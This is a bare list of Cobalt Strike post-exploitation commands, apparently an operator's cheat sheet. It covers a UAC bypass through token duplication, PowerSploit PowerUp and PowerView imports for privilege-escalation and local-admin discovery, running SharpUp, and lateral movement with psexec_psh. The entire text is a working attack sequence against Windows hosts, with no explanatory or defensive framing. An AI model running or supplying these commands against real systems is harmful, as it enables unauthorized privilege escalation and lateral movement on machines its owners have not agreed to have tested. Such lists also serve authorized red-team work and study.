````
elevate uac-token-duplication <listener>
powershell-import /root/tools/PowerSploit/Privesc/PowerUp.ps1
powerpick Invoke-PrivescAudit
powershell-import /root/tools/PowerSploit/Recon/PowerView.ps1
powerpick Find-LocalAdminAccess
execute-assembly ~/Desktop/SharpUp.exe
jump psexec_psh 127.0.0.1 <listener name>
````